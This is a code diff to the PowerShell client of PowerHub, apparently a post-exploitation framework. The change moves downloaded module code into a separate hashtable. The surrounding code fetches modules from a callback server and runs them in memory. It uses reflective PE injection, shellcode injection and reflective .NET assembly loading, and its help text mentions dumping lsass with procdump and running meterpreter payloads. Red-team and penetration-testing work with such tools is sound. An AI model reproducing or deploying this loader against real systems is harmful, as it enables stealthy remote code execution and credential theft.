@@ -14,6 +14,8 @@ $CALLBACK_URL = "{{callback_url}}"
 $WebClient = New-Object Net.WebClient
 $TransportScheme = "{{transport}}"
 $WEBDAV_URL = "{{webdav_url}}"
+{# The actual code (i.e. the content) of the modules is stored in this separate hashtable #}
+$PowerHubModulesContent = @{}
 
 $CALLBACK_HOST = [regex]::Match($CALLBACK_URL, '(.+/)([^:/]+)((:|/).*)').captures.groups[2].value
 $PS_VERSION = $PSVersionTable.PSVersion.Major
@@ -133,16 +135,21 @@ function Update-HubModules {
     Invoke-Expression "$ModuleList"  | Out-Null
     $Global:PowerHubModules = $PowerHubModules
     $PowerHubModules | Format-Table -AutoSize -Property N,Type,Name,Loaded
+    foreach ($m in $PowerHubModules) {
+        if ($PowerHubModulesContent.ContainsKey($m.Name)) {
+            $m.Loaded = $True
+        }
+    }
 }
 
 function Import-HubModule {
 
     Param(
         [parameter(Mandatory=$true)]
-        $Module
+        $module
     )
 
-    $code = $Module.Code
+    $code = $PowerHubModulesContent.($module.Name)
     $sb = [Scriptblock]::Create($code)
     New-Module -ScriptBlock $sb | Out-Null
 
@@ -266,10 +273,11 @@ Use the '-Verbose' option to print detailed information.
                 $transport_args = @{"m"=$module.N}
                 # if ($PS_VERSION -eq 2) { $args["c"] = "1" }
                 if ($module.Type -eq 'ps1') {
-                    $module.Code = Transport-String "module" $transport_args
+                    $code = Transport-String "module" $transport_args
+                    $PowerHubModulesContent.($module.Name) = $code
                     Import-HubModule $module
                 } else {
-                    $module.Code = Transport-String "module" $transport_args $True
+                    $PowerHubModulesContent.($module.Name) = Transport-String "module" $transport_args $True
                     # Get Basename
                     if ($Module.Name.Contains('/')) {
                         $AliasName = $Module.Name.split('/')
@@ -365,7 +373,7 @@ Run the binary whose name matches 'procdump64' in memory and dump the lsass proc
         }
         if (Get-Command "Invoke-ReflectivePEInjection" -errorAction SilentlyContinue) {
             foreach ($m in $Module) {
-                Invoke-ReflectivePEInjection -PEBytes $m.Code -ForceASLR -ExeArgs $ExeArgs
+                Invoke-ReflectivePEInjection -PEBytes $PowerHubModulesContent.($m.Name) -ForceASLR -ExeArgs $ExeArgs
             }
         } else {
             Write-Error "[-] PowerSploit's Invoke-ReflectivePEInjection not available. You need to load it first."
@@ -412,7 +420,7 @@ Load the PE module with the name 'meterpreter.exe' in memory and save it to disk
     )
 
     foreach ($m in $Module) {
-        $code = $m.Code
+        $code = $PowerHubModulesContent.($m.Name)
         if ($Directory) {
             $Filename = "$Directory/$($m.BaseName)"
         } else {
@@ -503,7 +511,7 @@ Load the shellcode module with the name 'meterpreter.bin' in memory and run it
     if (Get-Command "Invoke-Shellcode" -errorAction SilentlyContinue)
     {
         foreach ($m in $Module) {
-            $code = $m.Code
+            $code = $PowerHubModulesContent.($m.Name)
             if ($ProcessID) {
                 Invoke-Shellcode -Shellcode $code -ProcessID $ProcessID
             } else {
@@ -572,7 +580,7 @@ Load the .NET module with the name 'meterpreter.exe' in memory and run it
     [Environment]::CurrentDirectory = Get-Location
 
     foreach ($m in $Module) {
-        $code = $m.Code
+        $code = $PowerHubModulesContent.($m.Name)
         $a = [Reflection.Assembly]::Load([byte[]]$code)
         $al = New-Object -TypeName System.Collections.ArrayList
         $al.add($Arguments)
